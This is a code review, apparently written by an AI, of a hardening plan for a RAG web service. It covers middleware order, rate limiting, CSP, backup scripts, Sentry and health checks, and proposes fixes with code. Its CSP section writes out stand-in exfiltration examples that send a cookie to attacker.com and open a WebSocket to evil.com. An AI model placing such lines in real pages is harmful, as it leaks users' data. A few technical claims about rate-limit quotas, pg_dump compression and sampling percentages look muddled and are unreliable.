# M12 Hardening Plan · Review 报告

> 评审对象：[2026-06-11-rag-m12-hardening.md](../2026-06-11-rag-m12-hardening.md)（1391 行 / 58KB · V1 最后一步）
> 评审基线：[V1 Scope §5 错误矩阵](../../specs/2026-06-10-rag-v1-scope.md) · [System Design §3.12 / §7 / §8](../../specs/2026-06-11-rag-system-design.md) · [2026-06-11-rag-plans-review.md](../2026-06-11-rag-plans-review.md) P0-1 / P0-5 / P1-7 / X-4 · M2/M5/M8/M10/M11 五份 cross-cutting review
> 评审时间：2026-06-11
> 评审者：Hermes (MiniMax-M3)

---

## 总评

M12 是 V1 收尾里程碑，4 大块（限速 / 安全头 / 备份 / Sentry）+ prod 部署 + CI 全部覆盖到位，结构遵循 11 段模板，TDD 红绿标注清晰，已主动吸收 `plans-review` 的 P0-1（端口避雷）/ P0-5（真 PG service container）/ P1-7（Argon2 OWASP 升级）/ X-4（prod env 注入）。**但有几个**与 spec 矛盾、和既有 M 的 cross-cutting review **直接冲突**、以及**新发现的实质性缺口**，动手前必须先关掉。

| 维度 | 评分 | 说明 |
|---|---|---|
| 结构完整性 | ⭐⭐⭐⭐⭐ | 11 段模板齐；Goal / Files / Tasks / DoD / 风险齐备 |
| TDD 标注 | ⭐⭐⭐⭐⭐ | RED-GREEN-REFACTOR 模式统一；CI mock vs integration 区分 |
| 任务粒度 | ⭐⭐⭐⭐ | 多数 2-5 分钟；Day 3/4 任务略粗 |
| 与 spec 对齐 | ⭐⭐⭐ | **挂载顺序与 spec §3.12 矛盾**；CSP img-src 比 spec 宽松 |
| 跨 M 一致性 | ⭐⭐⭐ | M8 P0-1/2 未关、M10 P0-3 trace_id API 错、M11 P0-6 get_current_trace_id 错 → M12 直接踩雷 |
| 实施就绪度 | ⭐⭐⭐ | P0 阻塞 4 条不改动不了笔 |

---

## P0 · 阻塞级（动手前必改）

### P0-1 · 中间件挂载顺序与 spec §3.12 矛盾

**位置**：M12 Task 7 GREEN 段 L487-494 + 数据流图 L100

**spec §3.12 L396** 明确写：
> 挂载顺序：`RateLimit → SecurityHeaders → RequestID → CORSMiddleware → Auth`

**M12 plan** 写：
```python
app.add_middleware(ErrorHandlerMiddleware)       # 最外层，捕获所有
app.add_middleware(SecurityHeadersMiddleware)
app.add_middleware(RateLimitMiddleware)
app.add_middleware(RequestIDMiddleware)          # M8 已建
```

**问题**：
1. **顺序倒置** —— RateLimit 应在最前（拒绝请求成本最低，避免后续 middleware 跑白工），plan 把 SecurityHeaders 放 RateLimit 前面等于"先种头再拒"白白执行 header 注入
2. **ErrorHandler 写法错** —— FastAPI `add_middleware` 是 **栈式 LIFO**，最后 add 的最先执行；写 `app.add_middleware(ErrorHandlerMiddleware)` 第一行 ≠ "最外层"。要么用 starlette 中间件 base class，要么改注释
3. **spec 里 CORSMiddleware 在 RateLimit 之后** —— 计划完全没提 CORS；M8 review P2-8 已警告"缺 `APP_ENV` 环境感知（Swagger docs / debug / CORS）"，M12 必须补 `app.add_middleware(CORSMiddleware, allow_origins=[...], allow_methods=["GET","POST"])`，按 spec 顺序挂在 RateLimit/SecurityHeaders 之后

**修改**（按 spec §3.12 严格对齐）：
```python
# app/api/main.py（M12 改写）
app.add_middleware(ErrorHandlerMiddleware)        # 外层兜底
app.add_middleware(RateLimitMiddleware)            # 1. 先限速（成本低）
app.add_middleware(SecurityHeadersMiddleware)     # 2. 再注头
app.add_middleware(RequestIDMiddleware)            # 3. 注入 request_id
app.add_middleware(                             # 4. CORS
    CORSMiddleware,
    allow_origins=settings.cors.allow_origins,    # 来自 config
    allow_credentials=True,
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"],
)
# Auth 不是 middleware，是 Depends(get_current_user)，挂在 router 层
```

**附加 RED 测试**：
- `test_middleware_order_rate_limit_runs_before_security_headers`（用 timing counter 验证：rate-limited 请求不触发 SecurityHeaders 调用计数）

---

### P0-2 · M12 直接复用 `get_current_trace_id()`，但 M10 / M11 review 已标注此 API 在 langfuse 2.50+ **不存在**

**位置**：M12 Task 10 GREEN 段 L609-612 + Task 11 RED 段 L640

```python
from app.observability.langfuse import get_current_trace_id  # ⚠️ 不存在
```

**问题**：
- **M10 review P0-3**（L141-147）：`handler.get_trace_id()` 不是 CallbackHandler 公开 API
- **M11 review P0-6**（L299-334）：`app.observability.langfuse.get_current_trace_id()` API 与 langfuse 2.50+ 不匹配
- **两处 review 都未在 M12 plan 里回头标注** —— M12 直接 import 必然报错

**修改方案 A（推荐）**：用 `ContextVar` 在 LangGraph 节点入口/出口存 trace_id
```python
# app/observability/langfuse.py（M10 已建，M12 追加）
import contextvars
_trace_id_var: contextvars.ContextVar[str | None] = contextvars.ContextVar("langfuse_trace_id", default=None)

def set_trace_id(tid: str) -> None:
    _trace_id_var.set(tid)

def get_current_trace_id() -> str | None:
    return _trace_id_var.get()

# M12 sentry.py 改：
def set_langfuse_trace_id(trace_id: str) -> None:
    with sentry_sdk.configure_scope() as scope:
        scope.set_tag("langfuse_trace_id", trace_id or "n/a")
```

**附加**：M12 plan 没写"谁负责在 LangGraph 节点出口 `set_trace_id`"——是 M10 范畴（应回填 M10 review）或 M12 跨接。明确"task boundary"，否则 **Task 10 写完 import 就崩**。

---

### P0-3 · 备份脚本 `pg_backup.sh` 第 728 行 `PGPASSWORD` + Task 13 测试 `test_pg_backup_creates_gzipped_dump_file` 集成测试**未实现路径**

**位置**：M12 Task 13 GREEN L728-747 + RED 测试 L749-752

**问题**：
1. `pg_backup.sh` 写 `--format=custom --compress=9`（pg_dump binary 格式 + 压缩），但备份文件名后缀是 `.dump`，无 `.gz`（`compress=9` 已内嵌压缩）；Task 13 RED 测试又写"gzipped dump file"语义模糊
2. `tests/unit/test_backup_scripts.py` **完全没在 Files 表 / Task 列表里出现** —— L706 突然冒出 `tests/unit/test_backup_scripts.py::test_pg_backup_script_exists_and_executable`，M12 Files 表 L213-216 没列这个文件。**RED 测试的载体文件本身不存在**
3. 集成测试 `test_backup_and_restore_roundtrip_preserves_data` 写"CI 用 testcontainers"——但 Task 17 infra `docker-compose.yml`（base，M0 已建）里**只有 4 个 service（postgres / opensearch / tei / langfuse）**，没有 MinIO service。M12 backup 强制走 MinIO 上传需要新加 `minio` service 到 docker-compose.yml 或新建 `docker-compose.backup.yml`，但 plan 完全没写

**修改**：
1. Files 表 L213-216 补 `tests/unit/test_backup_scripts.py`
2. `pg_backup.sh` 把文件名改成 `rag_${TIMESTAMP}.dump`（**无 `.gz`**），注释写"binary format 自带 zstd 压缩"
3. 新增 `infra/docker-compose.minio.yml`（MinIO 单 service + bucket init），restore.sh 集成测试依赖它
4. RED 测试名改清楚：`test_pg_backup_produces_pg_restore_compatible_file`（替代 "gzipped"）

---

### P0-4 · `infra/backup/restore.sh` 第 830-833 行 prod 检查可被任意绕过，**与 P0 风险宣称不符**

**位置**：M12 Task 16 GREEN L821-848

```bash
if [ "${ENV:-}" = "prod" ]; then
    echo "❌ 禁止在 prod 跑恢复脚本！"
    exit 1
fi
```

**问题**：
1. **仅检查 `ENV` 变量**；用户没设 `ENV=prod` 就 bypass 掉了
2. **prompt 等待 `read -p` 确认** —— 在 CI testcontainer 跑测试时 stdin 是 closed，read 直接 EOF，confirm 变量空，`[ "$confirm" = "yes" ]` 假，**脚本 exit 1，集成测试必挂**
3. 与 plan 风险表 L1372 "备份恢复演练误删 prod 数据"宣称的保护强度严重不符

**修改**：
```bash
#!/usr/bin/env bash
set -euo pipefail

# 必须显式传 STAGING_CONFIRM=yes 才能跑（任何缺失都拒绝）
if [ "${STAGING_CONFIRM:-}" != "yes" ]; then
    echo "❌ 必须设 STAGING_CONFIRM=yes 才能跑恢复脚本（防误删 prod）"
    echo "   例：STAGING_CONFIRM=yes ENV=staging $0 /path/to/backup.dump"
    exit 1
fi

if [ "${ENV:-}" != "staging" ]; then
    echo "❌ ENV 必须=staging（当前=${ENV:-unset}）"
    exit 1
fi

# CI testcontainer 测试用 AUTO_CONFIRM=yes 跳过交互
if [ "${AUTO_CONFIRM:-}" != "yes" ]; then
    read -p "确认 staging 环境？[yes/no] " confirm
    [ "$confirm" = "yes" ] || exit 1
fi

# ... drop + restore 逻辑
```

**CI 测试用例**：`AUTO_CONFIRM=yes ENV=staging STAGING_CONFIRM=yes ./restore.sh test.dump` 应 exit 0
**反例测试**：`./restore.sh test.dump` 应 exit 1（双门禁）

---

## P1 · 重要

### P1-1 · RateLimit middleware 在 5xx 错误响应**也消耗配额**——攻击者可用故意触发 5xx 来饿死合法用户

**位置**：Task 4 GREEN L396-410

**问题**：slowapi `limiter.check(request)` 在 `call_next` 之前跑，意思是**只要 IP 命中限速阈值 → 429，不区分错误响应**。但反过来，**5xx 错误响应也会消耗配额**（call_next 之后的 limiter 状态已记录），攻击者发 100 个 `/api/chat` 触发 5xx，正常用户第 101 个会被 429。

**修改方案**：slowapi 装饰器 + `scope` 参数 `scope="ip"` 默认 IP；V1 单实例够用，但 plan 应明确写"`/api/chat` 限速 key_func 优先用 `get_jwt_user_id` 替代 `get_remote_address`"，否则 V1 已经把"per-user"语义按 IP 实现，与 spec §7.5 L758 "`POST /api/chat` 30/min/user"不符。

**修改**：
```python
# app/middleware/rate_limit.py
async def get_rate_limit_key(request: Request) -> str:
    """优先按 user_id（从 JWT 解析），fallback 到 IP"""
    try:
        user_id = await get_current_user_optional(request)
        return f"user:{user_id.id}" if user_id else f"ip:{get_remote_address(request)}"
    except Exception:
        return f"ip:{get_remote_address(request)}"
```

**RED 测试**：`test_chat_30_per_minute_per_user_not_per_ip`（同 IP 不同 user → 各 30 次都不冲突）

---

### P1-2 · `get_remote_address` 信任 `X-Forwarded-For`，**未配置 TrustedHost middleware**——可伪造 IP 绕过限速

**位置**：Task 4 默认 `key_func=get_remote_address`

**问题**：
1. slowapi `get_remote_address` 取 `request.client.host`，**不读 `X-Forwarded-For`**——这点 OK（防伪造）
2. 但 plan 完全没提 prod 部署在 nginx/Caddy 后，`request.client.host` 永远是 nginx 的 IP，**所有用户限速共享一个桶** = 1 个用户超阈值全员 429
3. plan 完全没提 `uvicorn --proxy-headers` 或 `app.add_middleware(ProxyHeadersMiddleware, trusted_hosts="*")`（starlette 内置）

**修改**：
1. **RED 测试**：`test_rate_limit_trust_x_forwarded_for_when_proxy_headers_enabled`
2. **GREEN**：`uvicorn` 启动加 `--proxy-headers --forwarded-allow-ips="10.0.0.0/8,172.16.0.0/12"`（prod 由 nginx reverse proxy 转发）
3. `infra/README.md` prod 部署文档明确写"prod 必须前置 nginx，所有 client IP 由 `X-Forwarded-For` 注入"

---

### P1-3 · CSP `connect-src` 写 `ws: wss:` 全局放行 WebSocket，**且 img-src 含 `https:` 通配**——比 spec §7.4 宽松

**位置**：Task 6 GREEN L465-467

**plan 写**：
```
connect-src 'self' ws: wss:;
img-src 'self' data: https:;
```

**spec §7.4 写**：
```
img-src 'self' data:;
connect-src 'self' http://localhost:8000;
```

**问题**：
1. `img-src https:` 意味着**任意 HTTPS 图片外链可被 inline 渲染**——SSRF 数据外泄攻击面（攻击者塞 `<img src="https://attacker.com/exfil?cookie=...">` 通过 Gradio chat 渲染）
2. `connect-src ws: wss:` 全局放行 WebSocket 协议不限域——恶意 JS 可 `new WebSocket("wss://evil.com")` 双向通道外泄
3. plan 完全没考虑 Gradio UI 的 XSS 风险：spec §7.3 PII 脱敏强调，**chat 的 answer 字符串含 `[1][2][3]` 用户输入可能回流**——CSP 应该收紧

**修改**（按 spec §7.4 严格对齐）：
```
default-src 'self';
script-src 'self' 'unsafe-inline';     # Gradio 5.0+ 必加
style-src 'self' 'unsafe-inline';
img-src 'self' data:;                  # 不放 https:（防 SSRF exfil）
font-src 'self';
connect-src 'self' ws: wss: http://localhost:8000;  # Gradio→FastAPI CORS
frame-ancestors 'none';
```

**RED 测试**：`test_csp_img_src_does_not_allow_https_wildcard`（避免 SSRF exfil 回归）

---

### P1-4 · 缺 `RateLimit-Reset` 响应头 + 429 响应体格式与错误矩阵不一致

**位置**：Task 4 L405-408 + Task 5 L443-446

**问题**：
1. Task 4 L407 写 429 body `{"error_code": "rate_limited", "message": "请求过于频繁"}` —— **error_code 是 "rate_limited"**，但 11 条错误矩阵里**没有 `RateLimitedError`** 类，应该补一个
2. Task 5 L445 "slowapi 自动注入 `Retry-After` header" —— 实际慢 api 装饰器 `@limiter.limit("30/minute")` 是注册到 slowapi 内部 handler `_rate_limit_exceeded_handler`，**需要 `app.state.limiter = limiter` + `app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)` 才生效**，plan 完全没写这步
3. 缺 `X-RateLimit-Limit` / `X-RateLimit-Remaining` / `X-RateLimit-Reset` 三个标准头（业界事实标准，方便前端友好提示）

**修改**：
1. `app/middleware/errors.py` 加 `RateLimitedError(RAGError)`（`http_status=429`, `error_code="rate_limited"`）
2. `app/api/main.py` 加：
   ```python
   from slowapi.errors import RateLimitExceeded
   from slowapi import _rate_limit_exceeded_handler
   app.state.limiter = limiter
   app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
   ```
3. 新增 `app/middleware/rate_limit_headers.py`：在 `call_next` 之后注入 `X-RateLimit-*` 三个头

**RED 测试**：
- `test_429_response_includes_retry_after_header`
- `test_429_response_body_matches_error_matrix_schema`
- `test_rate_limited_error_has_request_id_in_body`

---

### P1-5 · Sentry 配置 `traces_sample_rate=0.1` 在 dev 环境也启用，**dev 误报污染 Sentry 项目**

**位置**：Task 10 GREEN L601-603

```python
sentry_sdk.init(
    dsn=dsn,
    integrations=[FastApiIntegration()],
    traces_sample_rate=0.1,
    environment=settings.env,
)
```

**问题**：
1. 缺 `before_send` PII filter —— spec §7.3 L733-738 强调 password / token / api_key 必须 `***` 脱敏，但 Sentry 上报会把 `request_id` / `user_id` / 错误堆栈里的 query 文本全部外发（`POST /api/auth/login` body 含 password）
2. `traces_sample_rate=0.1` 在 dev 环境也采 —— dev 频繁重启会污染 Sentry 看板数据
3. 缺 `profiles_sample_rate` 配置（sentry-sdk 默认开启 profiling 0.0，要显式声明）

**修改**：
```python
def _scrub_pii(event, hint):
    """PII 脱敏 before_send"""
    if 'request' in event and 'data' in event['request']:
        body = event['request']['data']
        if isinstance(body, dict):
            for k in ('password', 'token', 'api_key', 'secret'):
                if k in body:
                    body[k] = '[REDACTED]'
    # query 文本截断防日志爆炸
    if 'logentry' in event and 'message' in event['logentry']:
        msg = event['logentry']['message']
        if len(msg) > 500:
            event['logentry']['message'] = msg[:500] + '...[truncated]'
    return event

def init_sentry() -> None:
    dsn = settings.sentry.dsn
    if not dsn or settings.env == "development":
        return  # dev 无 DSN 或环境=development 直接跳过
    sentry_sdk.init(
        dsn=dsn,
        integrations=[FastApiIntegration()],
        traces_sample_rate=settings.sentry.traces_sample_rate,  # 默认 0.1
        profiles_sample_rate=settings.sentry.profiles_sample_rate,  # 默认 0.0
        environment=settings.env,
        before_send=_scrub_pii,
        send_default_pii=False,  # 默认不发送 PII
    )
```

**RED 测试**：
- `test_sentry_skips_init_when_env_is_development`
- `test_sentry_before_send_redacts_password_field`
- `test_sentry_before_send_truncates_long_messages`

---

### P1-6 · `check_graph()` 调 `graph.invoke({"query": "ping"})` 探测 LLM，**会污染生产 Langfuse trace + 触发 OpenSearch kNN 检索**

**位置**：Task 20 GREEN L1069-1073

```python
async def check_graph():
    graph = get_graph()
    graph.invoke({"query": "ping"}, config={"configurable": {"thread_id": "health-check"}})
```

**问题**：
1. `thread_id="health-check"` 这个固定值**会在 Langfuse / chat_sessions 里堆积**（每秒 1 次探测 = 86400 条垃圾 session/天）
2. `graph.invoke` 触发完整 7 节点链路 = LLM 调用 + OpenSearch kNN = **每次 health check 烧钱 + 烧延迟**
3. 与 M10 review P1-5 HandlerPool 冲突 + M11 review P2-4 "judge LLM 应不接 Langfuse" 同类问题
4. **真正的 health check 应该只测连接性**（httpx ping TEI / OS / PG / Langfuse HTTP / LLM endpoint TCP），不应跑业务

**修改**：
```python
async def check_graph():
    """只测 graph 编译可用，不跑业务"""
    graph = get_graph()
    # 仅验证 graph 对象存在 + nodes 数 ≥ 7（M7 spec）
    assert len(graph.nodes) >= 7

async def check_langfuse():
    """HTTP GET /api/public/health，不调 callback"""
    async with httpx.AsyncClient() as client:
        r = await client.get(f"{settings.langfuse.host}/api/public/health", timeout=2.0)
        r.raise_for_status()
```

**RED 测试**：
- `test_health_check_does_not_invoke_llm`（mock LLM 抛错但 health 仍 200）
- `test_health_check_does_not_create_langfuse_trace`（用 M10 review P0-5 提到的 trace 计数器）

---

### P1-7 · Health check 5 service **超时无统一上限**——单个慢探测会拖垮整个 health endpoint

**位置**：Task 20 GREEN L1041-1046

```python
for name, checker in [...]:
    t0 = time.monotonic()
    await checker()  # 无 asyncio.timeout！
```

**问题**：
1. `/api/health` 假设 5 service × 2s = 10s 总耗时 —— k8s readiness 默认 1s 超时，**直接判 down**
2. 没有 `asyncio.wait_for(checker, timeout=2.0)` —— TEI 冷启动 bge-m3 可能 > 30s
3. 没有并行探测（5 个串行 ~ 总和）

**修改**：
```python
async def _run_check(name, checker, timeout=2.0):
    try:
        async with asyncio.timeout(timeout):  # py3.11+
            await checker()
        return name, {"status": "ok"}
    except (asyncio.TimeoutError, Exception) as e:
        return name, {"status": "down", "error": str(e)[:200]}

async def health():
    results = await asyncio.gather(*[
        _run_check(name, checker) for name, checker in [...]
    ])
    services = dict(results)
    all_ok = all(s["status"] == "ok" for s in services.values())
    return JSONResponse(
        status_code=200 if all_ok else 503,
        content={"services": services, "all_ok": all_ok},
    )
```

**RED 测试**：
- `test_health_endpoint_returns_within_3_seconds_even_when_one_service_times_out`
- `test_health_parallel_checks_total_latency_under_3s`

---

### P1-8 · CI integration job 用 `sleep 30` 等服务起 —— **脆性 + 慢**（GitHub Actions runner 上 TEI 冷启可能 > 60s）

**位置**：Task 21 L1134-1136

```yaml
- run: docker compose -f infra/docker-compose.yml up -d
- run: sleep 30  # 等服务起来
- run: cd apps/rag_v1 && pytest tests/integration/ -v
```

**问题**：
1. `sleep 30` 是 P0-3 healthcheck 缺失的补丁——但 plan 仅在 base docker-compose 加了 healthcheck（M0 review P0-3 修过），**未验证 M0 healthcheck 在 CI runner 上**真的可用
2. TEI bge-m3 cold start 在 CI runner 可能 60-90s（CPU 无 GPU）—— 30s 不够 → integration 必挂
3. integration job 没设 timeout，`sleep 30 + pytest integration 5min` 可能超 GitHub Actions 默认 6h（不会，但 resource 浪费）

**修改**：
```yaml
integration:
  runs-on: ubuntu-latest
  timeout-minutes: 30
  services:
    postgres:
      image: postgres:16-alpine
      options: --health-cmd "pg_isready" --health-interval 5s --health-timeout 3s --health-retries 10
  steps:
    - run: docker compose -f infra/docker-compose.yml up -d --wait
      # --wait 阻塞直到所有 healthcheck 通过（Compose v2.20+）
    - run: cd apps/rag_v1 && pytest tests/integration/ -v --timeout=300
```

**RED 测试**：`test_ci_workflow_uses_compose_wait_not_sleep_30`（解析 yaml 断言 `up -d --wait`，无 `sleep 30`）

---

### P1-9 · 备份 retention 30 天 + MinIO access/secret_key 在 BackupSettings 明文默认，**违反 plans-review P1-3 精神**

**位置**：Task 12 GREEN L680-690

```python
class BackupSettings(BaseSettings):
    minio_access_key: str = ""
    minio_secret_key: str = ""
```

**问题**：
1. 空默认值 OK，但 **Type hint 没声明应来自哪里** —— plan 没约束"必须从 docker secrets 读"，新人可能 `.env` 写 `MINIO_SECRET_KEY=abc123` 进 git
2. backup_retention=30 天 vs GDPR —— plan 风险表 L1382 提了"含用户密码 hash、session token hash"但**没论证 30 天的合规性**
3. 缺 `backup_retention_max` 上限保护 —— 有人可能误设 36500 天把磁盘撑爆

**修改**：
```python
class BackupSettings(BaseSettings):
    # MinIO creds 必须来自 docker secrets / vault，不接受 .env 明文
    minio_access_key_file: str = ""  # _FILE 后缀走 docker secrets 模式
    minio_secret_key_file: str = ""
    # ... 删 minio_access_key / minio_secret_key 字段

    backup_retention_days: int = Field(default=30, ge=7, le=365)  # 上下界保护
```

**RED 测试**：`test_backup_settings_rejects_retention_above_365_days`

---

### P1-10 · `/api/health` 端点被 rate_limit **完全 bypass** —— 攻击者可高频 health 请求**间接探测后端拓扑** + 占带宽

**位置**：Task 4 GREEN L397-399 + spec §7.5

**问题**：
1. spec §7.5 L760 "`GET /api/health` 不限" 是合理的（k8s / LB 高频探活用），但 bypass 在 middleware 顶层 `if request.url.path == "/api/health"` 太简单 —— **任何 path 以 `/api/health` 开头的都 bypass**（`/api/health/dump` `/api/healthcheck` 等潜在子路径都不限）
2. health endpoint 应**不返回敏感信息**（数据库表名 / 用户数 / 索引大小等），但 plan L1032-1051 没禁止 `verbose=True` mode
3. 应支持 `?verbose=true` 仅给 admin token（spec 没写，但生产有需求）

**修改**：
```python
HEALTH_PATHS = {"/api/health"}

async def rate_limit_middleware(request, call_next):
    if request.url.path in HEALTH_PATHS:
        return await call_next(request)
    # ... 限速逻辑
```

**附加**：健康检查响应体 L1050 加 `"services"` detail 只在 `?verbose=true` 且 header `X-Admin-Token` 匹配才返回，否则只返 `{all_ok: true}`

**RED 测试**：
- `test_health_bypass_only_exact_path`
- `test_health_verbose_requires_admin_token`

---

## P2 · 优化

### P2-1 · SlowAPI 内存 token bucket 在多 worker 进程下**失效**（每个 worker 独立桶）

**位置**：Task 4 L388-410（限速选型）

**问题**：plan 限速用 slowapi 内存实现（依赖 limits 库的 MemoryStorage），uvicorn 启动 `--workers 4`（prod 计划）后**每个 worker 一个桶，限速阈值实际 ×4**。

**V1 缓解**：plan 风险表没写；spec §6 "V1 单实例" 似乎说明 V1 不上多 worker（Task 17 prod compose `api_workers: int = 4` 又说要 4 worker——**自相矛盾**）。

**修改**：plan 风险表加一条 "**prod `--workers > 1` 时 slowapi 内存桶不生效**"，并：
- 方案 A（推荐）：spec 改为单 worker uvicorn + gunicorn `--workers 1 --threads 8`（async 模型下 threads 即可）
- 方案 B：限速后端换 Redis（V1 不引）→ V2 升级
- 在 `infra/docker-compose.prod.yml` 改 `api_workers: int = 1`

---

### P2-2 · `app/api/health.py` import `app.auth.db.get_session` —— **M1 实际路径是 `app.db.session.get_session`**

**位置**：Task 20 GREEN L1025

```python
from app.auth.db import get_session  # ⚠️ 路径错
```

**实际**：根据 M1 review 和 spec §2 L99-104，路径是 `app.db.session.get_session`。M12 plan 这个 import 必然报错。

**修改**：Files 表标注 + GREEN 段改 `from app.db.session import get_session`

---

### P2-3 · `restore.sh` 把 `psql` 和 `pg_restore` 当系统命令假设，**CI runner 上未必安装**

**位置**：Task 16 GREEN L840-845

**问题**：GitHub Actions `ubuntu-latest` 默认不带 `postgresql-client`，`psql` / `pg_restore` 找不到 → 集成测试挂。

**修改**：
```yaml
# .github/workflows/ci.yml integration job
- name: Install postgres client
  run: sudo apt-get update && sudo apt-get install -y postgresql-client
```

或改用 Python 脚本 `restore.py`（`asyncpg` + `pg_restore` Python API），但 V1 简化为装客户端即可。

---

### P2-4 · `health.py` 缺 `/api/health/ready` vs `/api/health/live` 区分（k8s readiness vs liveness）

**位置**：Task 20 整个

**问题**：k8s 标准 pattern 是：
- `/live`：进程活着（仅返 200）—— 不查下游
- `/ready`：能服务（5 service 全绿）—— 决定是否接流量

plan 只写一个 `/api/health`，**k8s liveness probe 失败会重启 pod（杀伤性大）**，必须把"进程活着"和"能服务"分开。

**修改**：拆 `/api/health/live`（返 200 + `{"status":"alive"}`）和 `/api/health/ready`（5 service check）

**RED 测试**：
- `test_liveness_endpoint_does_not_check_dependencies`
- `test_readiness_endpoint_returns_503_when_one_service_down`

---

### P2-5 · `app/middleware/request_id.py` 标注"M8 已建（M12 复用）" —— 但 plan 没写"复用接口是什么"

**位置**：架构图 L44 + Files 表 L212 `tests/unit/test_extend_session.py`

**问题**：
1. RequestIDMiddleware 在 M8 已建，**M12 没复用接口的代码示例** —— 新人接手不知怎么"复用"
2. 与 M10 review P2-6 `test_request_id_propagates_to_graph_metadata` 联动 —— Sentry tag `langfuse_trace_id` 注入依赖 `request_id` 链路打通

**修改**：在 M12 plan "与其他 M 的契约边界"表里加一行：
| M12 error_handler | `request.state.request_id` (M8 RequestIDMiddleware 设置) | 全链路 X-Request-Id 串联 |

---

### P2-6 · `SecurityHeadersMiddleware` 不处理 `OPTIONS` preflight 响应（CORS 头需返回）

**位置**：Task 6 GREEN L458-474

**问题**：CORS preflight `OPTIONS /api/chat` 不走业务路由，但 `call_next` 会返回 200 + 空 body，**CORS 头需要在 OPTIONS 响应里有 `Access-Control-Allow-*` 系列**。FastAPI CORSMiddleware 通常处理，但 middleware 顺序错位可能导致 preflight 失败。

**修改**：在 `security_headers_middleware` 里检测 `request.method == "OPTIONS"`，**跳过 SecurityHeaders 注入**（避免重复），让 CORSMiddleware 处理：

```python
async def security_headers_middleware(request, call_next):
    response = await call_next(request)
    if request.method == "OPTIONS":
        return response  # preflight 不加 CSP
    # ... 注入 CSP/HSTS 等
```

---

### P2-7 · `infra/scripts/ci_local.sh` 写 `cd apps/rag_v1 && pytest` 硬编码工作目录

**位置**：Task 24 GREEN L1235-1244

**问题**：脚本用 `cd "$(dirname "$0")/../.."` 算相对路径，但 `apps/rag_v1` 假设仓库根目录在 `apps/rag_v1/..`。**当 CI workflow 在 `working-directory: apps/rag_v1` 里跑 ci_local.sh 时，路径就错**（`../../..` 多了一级）。

**修改**：用 `git rev-parse --show-toplevel` 找仓库根：
```bash
#!/usr/bin/env bash
set -euo pipefail
REPO_ROOT="$(git rev-parse --show-toplevel)"
APP_DIR="${REPO_ROOT}/apps/rag_v1"
cd "${APP_DIR}"
ruff check app/ tests/
pytest tests/unit/ --cov=app --cov-fail-under=85
```

---

### P2-8 · `docker-compose.override.yml` 把 `POSTGRES_PASSWORD: rag_dev_password` 明文写死

**位置**：Task 18 GREEN L961

```yaml
environment:
  POSTGRES_PASSWORD: rag_dev_password  # dev 明文 OK
```

**问题**：plans-review P1-3 已经警告"明文 password 跟调性不一致"；M12 直接沿用是 OK 的（dev override），但 **plan 没说 override 文件应该 `.gitignore`** 或加注释"禁止复制到 prod"。

**修改**：在 `docker-compose.override.yml` 顶部加注释：
```yaml
# ⚠️ 本文件仅 dev 使用，禁止部署到 staging/prod
# 包含 dev 明文密码，故意保留便于本地 onboarding
```

---

### P2-9 · 备份脚本 `pg_backup.sh` 没校验 `BACKUP_FILE.dump` **实际大小**就上传 MinIO

**位置**：Task 13 GREEN L732-746

**问题**：`pg_dump` 失败（DB 不可达）但 `set -e` 没触发（pg_dump 自身可能 exit 0 但产生空文件），`pg_restore --list` 步骤可能不抛错但解出 0 tables。**空备份被静默上传**。

**修改**：
```bash
# 5. 校验备份大小（空文件 < 1KB 直接失败）
MIN_SIZE_BYTES=1024
FILE_SIZE=$(stat -c%s "${BACKUP_FILE}.dump")
if [ "${FILE_SIZE}" -lt "${MIN_SIZE_BYTES}" ]; then
    echo "❌ 备份文件过小 (${FILE_SIZE} bytes)，怀疑 pg_dump 失败"
    exit 1
fi

# 6. 校验包含关键表（users / auth_sessions / chat_sessions / ingest_jobs）
TABLES=$(pg_restore --list "${BACKUP_FILE}.dump" | grep -c "TABLE.*rag")
if [ "${TABLES}" -lt 4 ]; then
    echo "❌ 备份缺少关键表（仅 ${TABLES} 张，应 ≥4）"
    exit 1
fi
```

**RED 测试**：`test_pg_backup_fails_on_empty_dump_file`

---

### P2-10 · `/api/chat` RateLimit 30/min **未区分会话（thread_id）**——多轮对话被一次计数

**位置**：Task 5 GREEN L429-431

**问题**：spec §7.5 写 "30/min/user"，但 user 下可能有多个活跃 session，每个 session 30 条消息是合理需求。**当前实现 user 全局共享 = 实际效果是 30 条消息/分钟/user（无论几个 session）**。

**修改**：限速 key 改为 `f"user:{user_id}:endpoint:/api/chat"` 即可分离；或保留当前语义但在 DoD 明确写"30/min 是 user 总和而非 per-session"

**RED 测试**：`test_chat_30_per_minute_per_user_total_includes_all_sessions`

---

### P2-11 · `SentrySettings.traces_sample_rate=0.1` 在 prod 高流量下可能**漏报关键 5xx**

**位置**：Task 12 GREEN L668

**问题**：1% → 99% 错误丢失；500 errors/min × 1% = 5 errors/min 进 Sentry —— 还行；但 **5xx 中关键的 `LLMUpstreamError` (502) 100% 上报应该单独配**。

**修改**：
```python
def before_send_transaction(event, hint):
    """5xx 错误关联的 transaction 强制 100% 采样"""
    if 'request' in event and event.get('contexts', {}).get('response', {}).get('status_code', 0) >= 500:
        # 标记为必采（5xx 必须看到）
        event.setdefault('tags', {})['critical'] = '5xx'
    return event
```
配合 Sentry 端 alert rule "critical=5xx" 单独通知。

---

### P2-12 · `infra/docker-compose.prod.yml` 缺 `cap_drop: [ALL]` + `security_opt: [no-new-privileges]`

**位置**：Task 17 GREEN L870-932

**问题**：prod 容器应最小化 Linux capabilities（防 privilege escalation），但 plan prod compose 没设。

**修改**：每个 service 追加：
```yaml
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
cap_add:
  - CHOWN    # postgres 需要
  - SETUID
  - SETGID
  - DAC_OVERRIDE  # postgres 启动需要
```

---

## 跨 M 一致性问题

### X-1 · M12 plan 没引用 / 解决 M8 review P0-1/2

**M8 review 警告**：
- **P0-1**（L142-178）：`POST /api/chat` 端点缺 `asyncio.wait_for()` 超时保护
- **P0-2**（L179-207）：lifespan 关闭时缺 `asyncpg engine.dispose()` + DB session 清理

**M12 hardening 应一并收口**，否则：
- 5xx 错误矩阵里的 `LLMUpstreamError` 可能因为 chat 没超时而**永远不触发**
- prod shutdown 时 asyncpg engine 不 dispose → DB 连接泄漏

**修改**：M12 Task 17 prod 部署后追加 Task 26 `lifespan hardening`：
- `app/api/main.py` lifespan 启动时 `await asyncpg_engine.connect()` 探活
- shutdown 时 `await asyncio.wait_for(asyncpg_engine.dispose(), timeout=10)`
